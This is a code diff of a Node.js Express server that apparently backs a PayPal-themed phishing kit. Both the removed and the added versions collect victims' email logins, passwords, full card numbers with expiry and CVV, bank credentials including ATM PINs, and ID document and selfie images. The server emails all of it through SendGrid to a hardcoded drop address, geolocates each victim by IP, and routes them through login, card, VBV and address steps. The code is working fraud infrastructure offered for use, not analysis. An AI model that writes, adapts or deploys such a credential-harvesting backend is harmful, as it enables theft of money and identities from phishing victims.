@@ -1,354 +1,220 @@
 const express = require('express');
-const cors = require('cors');
+const session = require('express-session');
 const bodyParser = require('body-parser');
 const sgMail = require('@sendgrid/mail');
-const helmet = require('helmet');
-const rateLimit = require('express-rate-limit');
-require('dotenv').config();
-
+const axios = require('axios');
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-// Initialize SendGrid with API key from environment variables
+// Initialize SendGrid
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-// Security middleware
-app.use(helmet());
-
-// Rate limiting
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100 // limit each IP to 100 requests per windowMs
-});
-app.use(limiter);
-
-// CORS configuration
-app.use(cors({
-  origin: ['https://your-frontend-domain.onrender.com', 'http://localhost:3000'],
-  credentials: true
+// Middleware
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'default-secret',
+    resave: false,
+    saveUninitialized: true,
+    cookie: { secure: false }
 }));
 
-// Body parser middleware with increased limits for base64 images
-app.use(bodyParser.json({ limit: '10mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
+// CORS middleware
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    next();
+});
 
-// Your email configuration
-const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL || 'your-email@gmail.com';
-const SENDER_EMAIL = process.env.SENDER_EMAIL || 'noreply@yourapp.com';
-
-// Helper function to format email content in TEXT format based on page type
-function formatEmailData(data, pageType) {
-  const timestamp = new Date().toLocaleString();
-  let subject = '';
-  let textContent = `NEW FORM SUBMISSION - ${pageType.toUpperCase()}\n`;
-  textContent += '='.repeat(50) + '\n\n';
-  
-  textContent += `Time: ${timestamp}\n`;
-  textContent += `IP Address: ${data.ip_address || 'N/A'}\n`;
-  textContent += `User Agent: ${data.user_agent || 'N/A'}\n`;
-  textContent += `Screen Resolution: ${data.screen || 'N/A'}\n\n`;
-  textContent += '-'.repeat(50) + '\n';
-  textContent += 'SUBMISSION DATA:\n';
-  textContent += '-'.repeat(50) + '\n\n';
-
-  switch (pageType) {
-    case 'login':
-      subject = `🔐 Login Data - ${data.EML || 'Unknown Email'}`;
-      textContent += `EMAIL: ${data.EML || 'N/A'}\n`;
-      textContent += `PASSWORD: ${data.PWD || 'N/A'}\n`;
-      textContent += `SESSION KEY: ${data.acsh33nz0key || 'N/A'}\n`;
-      break;
-
-    case 'mail_access':
-      subject = `📧 Email Access Data - ${data.mailacess || 'Unknown Email'}`;
-      textContent += `EMAIL: ${data.mailacess || 'N/A'}\n`;
-      textContent += `PASSWORD: ${data.password || 'N/A'}\n`;
-      break;
-
-    case 'credit_card':
-      subject = `💳 Credit Card Data - ${data.fnm || 'Unknown Name'}`;
-      textContent += `CARD TYPE: ${data.ctp || 'N/A'}\n`;
-      textContent += `CARD NUMBER: ${data.ccn || 'N/A'}\n`;
-      textContent += `EXPIRY DATE: ${data.cex || 'N/A'}\n`;
-      textContent += `CVV: ${data.csc || 'N/A'}\n`;
-      textContent += `FULL NAME: ${data.fnm || 'N/A'}\n`;
-      textContent += `DATE OF BIRTH: ${data.dob || 'N/A'}\n`;
-      textContent += `ADDRESS: ${data.adr || 'N/A'}\n`;
-      textContent += `CITY: ${data.cty || 'N/A'}\n`;
-      textContent += `ZIP CODE: ${data.zip || 'N/A'}\n`;
-      textContent += `STATE: ${data.stt || 'N/A'}\n`;
-      textContent += `COUNTRY: ${data.cnt || 'N/A'}\n`;
-      textContent += `PHONE TYPE: ${data.ptp || 'N/A'}\n`;
-      textContent += `PHONE PREFIX: ${data.par || 'N/A'}\n`;
-      textContent += `PHONE NUMBER: ${data.pnm || 'N/A'}\n`;
-      break;
-
-    case 'bank_info':
-      subject = `🏦 Bank Information - ${data.userid || 'Unknown User'}`;
-      textContent += `USER ID: ${data.userid || 'N/A'}\n`;
-      textContent += `PASSWORD: ${data.passcode || 'N/A'}\n`;
-      textContent += `ACCOUNT NUMBER: ${data.accnumq || 'N/A'}\n`;
-      textContent += `ROUTING NUMBER: ${data.rounum || 'N/A'}\n`;
-      textContent += `IBAN: ${data.iban || 'N/A'}\n`;
-      textContent += `ATM PIN: ${data.atmpin || 'N/A'}\n`;
-      break;
-
-    case 'id_document':
-      subject = `🆔 ID Document Upload - ${data.doc_type || 'Unknown Type'}`;
-      textContent += `DOCUMENT TYPE: ${data.doc_type || 'N/A'}\n`;
-      textContent += `NUMBER OF IMAGES: ${data.images ? data.images.length : 0}\n`;
-      textContent += `IMAGES UPLOADED: ${data.images ? 'YES' : 'NO'}\n`;
-      
-      // Log image info without the actual base64 data
-      if (data.images && Array.isArray(data.images)) {
-        data.images.forEach((img, index) => {
-          textContent += `IMAGE ${index + 1}: [BASE64_DATA - ${img.length} characters]\n`;
-        });
-      }
-      break;
-
-    case 'id_selfie':
-      subject = `🤳 Selfie Upload - Identity Verification`;
-      textContent += `SELFIE UPLOAD: YES\n`;
-      textContent += `NUMBER OF SELFIES: ${data.images ? data.images.length : 0}\n`;
-      
-      if (data.images && Array.isArray(data.images)) {
-        data.images.forEach((img, index) => {
-          textContent += `SELFIE ${index + 1}: [BASE64_DATA - ${img.length} characters]\n`;
-        });
-      }
-      break;
-
-    default:
-      subject = `📄 Form Submission - Unknown Page`;
-      for (const [key, value] of Object.entries(data)) {
-        if (key !== 'ip_address' && key !== 'user_agent' && key !== 'screen' && 
-            key !== 'images' && !key.startsWith('file')) {
-          // Truncate long values
-          let displayValue = value;
-          if (typeof value === 'string' && value.length > 100) {
-            displayValue = value.substring(0, 100) + '... [TRUNCATED]';
-          }
-          textContent += `${key.toUpperCase()}: ${displayValue || 'N/A'}\n`;
+class DataCollector {
+    static async getSystemInfo(req) {
+        const userAgent = req.headers['user-agent'] || 'Unknown';
+        const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'Unknown';
+        
+        // Get country from IP
+        let country = 'Unknown';
+        try {
+            const response = await axios.get(`http://www.geoplugin.net/xml.gp?ip=${ip}`);
+            const match = response.data.match(/<geoplugin_countryName>([^<]*)<\/geoplugin_countryName>/);
+            country = match ? match[1] : 'Unknown';
+        } catch (error) {
+            country = 'Unknown';
         }
-      }
-  }
 
-  textContent += '\n' + '='.repeat(50) + '\n';
-  textContent += 'This email was automatically generated by the form submission server.\n';
+        // Get browser
+        const browser = this.getBrowser(userAgent);
+        
+        // Get OS
+        const os = this.getOS(userAgent);
 
-  return { subject, textContent };
-}
-
-// Helper function to detect page type based on data
-function detectPageType(data) {
-  if (data.EML && data.PWD) {
-    return 'login';
-  } else if (data.mailacess && data.password) {
-    return 'mail_access';
-  } else if (data.ccn && data.cex) {
-    return 'credit_card';
-  } else if (data.userid && data.passcode) {
-    return 'bank_info';
-  } else if (data.doc_type) {
-    return 'id_document';
-  } else if (data.id_slf) {
-    return 'id_selfie';
-  } else if (data.images && Array.isArray(data.images)) {
-    // If it has images but no specific type, check context
-    if (data.images.length > 0) {
-      const firstImage = data.images[0];
-      // Heuristic: selfies might be mentioned in the data or we can check image data prefix
-      if (data.selfie || firstImage.includes('selfie') || data.id_slf) {
-        return 'id_selfie';
-      } else {
-        return 'id_document';
-      }
+        return {
+            ip,
+            country,
+            browser,
+            os,
+            userAgent,
+            timestamp: new Date().toUTCString()
+        };
     }
-  }
-  return 'unknown';
-}
 
-// Helper function to sanitize data for logging (remove sensitive info)
-function sanitizeData(data) {
-  const sanitized = { ...data };
-  
-  // Remove base64 image data from logs to reduce noise
-  if (sanitized.images && Array.isArray(sanitized.images)) {
-    sanitized.images = [`${sanitized.images.length} images (base64 data hidden)`];
-  }
-  
-  // Truncate long values for logging
-  Object.keys(sanitized).forEach(key => {
-    if (typeof sanitized[key] === 'string' && sanitized[key].length > 100) {
-      sanitized[key] = sanitized[key].substring(0, 100) + '... [TRUNCATED]';
+    static getBrowser(userAgent) {
+        if (userAgent.includes('Opera') || userAgent.includes('OPR/')) return 'Opera';
+        if (userAgent.includes('Edge')) return 'Edge';
+        if (userAgent.includes('Chrome')) return 'Chrome';
+        if (userAgent.includes('Safari')) return 'Safari';
+        if (userAgent.includes('Firefox')) return 'Firefox';
+        if (userAgent.includes('MSIE') || userAgent.includes('Trident/7')) return 'Internet Explorer';
+        return 'Other';
     }
-  });
-  
-  return sanitized;
+
+    static getOS(userAgent) {
+        const osList = [
+            { regex: /windows nt 10/i, name: 'Windows 10' },
+            { regex: /windows nt 6.3/i, name: 'Windows 8.1' },
+            { regex: /windows nt 6.2/i, name: 'Windows 8' },
+            { regex: /windows nt 6.1/i, name: 'Windows 7' },
+            { regex: /windows nt 6.0/i, name: 'Windows Vista' },
+            { regex: /windows nt 5.2/i, name: 'Windows Server 2003/XP x64' },
+            { regex: /windows nt 5.1/i, name: 'Windows XP' },
+            { regex: /windows xp/i, name: 'Windows XP' },
+            { regex: /macintosh|mac os x/i, name: 'Mac OS X' },
+            { regex: /linux/i, name: 'Linux' },
+            { regex: /ubuntu/i, name: 'Ubuntu' },
+            { regex: /iphone/i, name: 'iPhone' },
+            { regex: /ipad/i, name: 'iPad' },
+            { regex: /android/i, name: 'Android' }
+        ];
+
+        for (let os of osList) {
+            if (os.regex.test(userAgent)) return os.name;
+        }
+        return 'Unknown OS';
+    }
+
+    static async sendEmail(data, type) {
+        try {
+            const systemInfo = await this.getSystemInfo(data.req);
+            
+            let message = `=== ${type.toUpperCase()} SUBMISSION ===\n`;
+            message += `Timestamp: ${systemInfo.timestamp}\n`;
+            message += `IP: ${systemInfo.ip}\n`;
+            message += `Country: ${systemInfo.country}\n`;
+            message += `OS: ${systemInfo.os}\n`;
+            message += `Browser: ${systemInfo.browser}\n\n`;
+            
+            // Add form data
+            message += `FORM DATA:\n`;
+            Object.keys(data.formData).forEach(key => {
+                if (data.formData[key]) {
+                    message += `${key}: ${data.formData[key]}\n`;
+                }
+            });
+
+            // Add session data if available
+            if (data.sessionData && Object.keys(data.sessionData).length > 0) {
+                message += `\nSESSION DATA:\n`;
+                Object.keys(data.sessionData).forEach(key => {
+                    if (data.sessionData[key] && !key.includes('cookie')) {
+                        message += `${key}: ${data.sessionData[key]}\n`;
+                    }
+                });
+            }
+
+            const msg = {
+                to: process.env.TO_EMAIL || 'congratulationspp@gmail.com',
+                from: process.env.FROM_EMAIL || 'noreply@yourapp.com',
+                subject: `Form Submission - ${type}`,
+                text: message
+            };
+
+            await sgMail.send(msg);
+            console.log(`Email sent for ${type}`);
+            return true;
+        } catch (error) {
+            console.error('SendGrid error:', error);
+            return false;
+        }
+    }
 }
 
-// Main endpoint to receive data from all pages
+// Single endpoint for all submissions
 app.post('/api/submit', async (req, res) => {
-  try {
-    const data = req.body;
-    const pageType = detectPageType(data);
-    
-    console.log('Received form data:', {
-      timestamp: new Date().toISOString(),
-      ip: req.ip,
-      userAgent: req.get('User-Agent'),
-      pageType: pageType,
-      data: sanitizeData(data)
-    });
+    try {
+        const formData = req.body;
+        
+        // Store data in session based on what's provided
+        if (formData.semail) req.session.EM = formData.semail;
+        if (formData.Spassword) req.session.PW = formData.Spassword;
+        if (formData.CardNumberInput) req.session.CARD = formData.CardNumberInput;
+        if (formData.CardExpInput) req.session.Data = formData.CardExpInput;
+        if (formData.CardcvvInput) req.session.CVV = formData.CardcvvInput;
+        
+        // Determine submission type
+        let type = 'unknown';
+        if (formData.semail && formData.Spassword) {
+            type = 'login';
+        } else if (formData.CardNumberInput) {
+            type = 'card';
+        } else if (formData.CVV || formData.password_vbv) {
+            type = 'vbv';
+        } else if (formData.FullNameInput) {
+            type = 'address';
+        }
 
-    // Format email content in TEXT format
-    const { subject, textContent } = formatEmailData(data, pageType);
+        // Prepare data for email
+        const emailData = {
+            req,
+            formData,
+            sessionData: req.session,
+            type
+        };
 
-    // Send email via SendGrid in TEXT format
-    const msg = {
-      to: RECIPIENT_EMAIL,
-      from: SENDER_EMAIL,
-      subject: subject,
-      text: textContent,
-    };
+        // Send email
+        await DataCollector.sendEmail(emailData, type);
 
-    await sgMail.send(msg);
-    console.log(`✅ Text email sent successfully for ${pageType} page`);
+        // Return appropriate response
+        res.json({ 
+            status: 'success', 
+            message: 'Data processed successfully',
+            next: getNextStep(type)
+        });
 
-    // Send simple "done" response to frontend (as expected by your PHP code)
-    res.status(200).send('done');
-
-  } catch (error) {
-    console.error('❌ Error processing form data:', error);
-    
-    // Log the error but still send "done" to not break the frontend flow
-    console.log('⚠️  Sending "done" response despite error to maintain flow');
-    res.status(200).send('done');
-  }
+    } catch (error) {
+        console.error('Submission error:', error);
+        res.status(500).json({ 
+            status: 'error', 
+            message: 'Internal server error' 
+        });
+    }
 });
 
-// Additional endpoint for image-heavy submissions with larger payloads
-app.post('/api/submit-images', async (req, res) => {
-  try {
-    const data = req.body;
-    const pageType = detectPageType(data);
-    
-    console.log('Received image submission:', {
-      timestamp: new Date().toISOString(),
-      ip: req.ip,
-      pageType: pageType,
-      imageCount: data.images ? data.images.length : 0,
-      data: sanitizeData(data)
-    });
-
-    // Format email content
-    const { subject, textContent } = formatEmailData(data, pageType);
-
-    // Send email
-    const msg = {
-      to: RECIPIENT_EMAIL,
-      from: SENDER_EMAIL,
-      subject: subject,
-      text: textContent,
+function getNextStep(type) {
+    const steps = {
+        'login': '/card',
+        'card': '/vbv', 
+        'vbv': '/address',
+        'address': '/complete',
+        'unknown': '/'
     };
+    return steps[type] || '/';
+}
 
-    await sgMail.send(msg);
-    console.log(`✅ Image submission email sent for ${pageType}`);
-
-    res.status(200).send('done');
-
-  } catch (error) {
-    console.error('❌ Error processing image submission:', error);
-    res.status(200).send('done'); // Still send done to not break flow
-  }
+// Health check
+app.get('/api/submit', (req, res) => {
+    res.json({ 
+        status: 'active', 
+        message: 'Server is running',
+        timestamp: new Date().toISOString()
+    });
 });
 
-// Health check endpoint
 app.get('/health', (req, res) => {
-  res.status(200).json({ 
-    status: 'OK', 
-    timestamp: new Date().toISOString(),
-    service: 'PayPal Data Receiver - Complete Version',
-    email_format: 'Plain Text',
-    supported_page_types: [
-      'login',
-      'mail_access', 
-      'credit_card',
-      'bank_info',
-      'id_document',
-      'id_selfie'
-    ]
-  });
+    res.send('OK');
 });
 
-// Status endpoint to check recent activity
-app.get('/status', (req, res) => {
-  res.status(200).json({
-    status: 'operational',
-    server_time: new Date().toISOString(),
-    uptime: process.uptime(),
-    memory_usage: process.memoryUsage(),
-    environment: process.env.NODE_ENV || 'development'
-  });
-});
-
-// Root endpoint
-app.get('/', (req, res) => {
-  res.json({ 
-    message: 'PayPal Data Receiver API is running',
-    description: 'Receives form data from all pages and sends email notifications',
-    email_format: 'Plain Text',
-    endpoints: {
-      '/api/submit': 'POST - Receive form data and send text email',
-      '/api/submit-images': 'POST - Receive image submissions',
-      '/health': 'GET - Health check',
-      '/status': 'GET - Server status'
-    },
-    usage: 'Send POST requests with form data to /api/submit'
-  });
-});
-
-// Error handling middleware
-app.use((err, req, res, next) => {
-  console.error('🛑 Unhandled error:', err);
-  res.status(500).send('error');
-});
-
-// 404 handler
-app.use('*', (req, res) => {
-  res.status(404).json({ 
-    status: 'error', 
-    message: 'Endpoint not found',
-    available_endpoints: [
-      'GET /',
-      'GET /health', 
-      'GET /status',
-      'POST /api/submit',
-      'POST /api/submit-images'
-    ]
-  });
-});
-
-// Graceful shutdown handling
-process.on('SIGTERM', () => {
-  console.log('SIGTERM received, shutting down gracefully');
-  process.exit(0);
-});
-
-process.on('SIGINT', () => {
-  console.log('SIGINT received, shutting down gracefully');
-  process.exit(0);
-});
-
-// Start server
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📧 Text emails will be sent to: ${RECIPIENT_EMAIL}`);
-  console.log(`📝 Email format: Plain Text`);
-  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
-  console.log(`📊 Status: http://localhost:${PORT}/status`);
-  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
 
 module.exports = app;
+
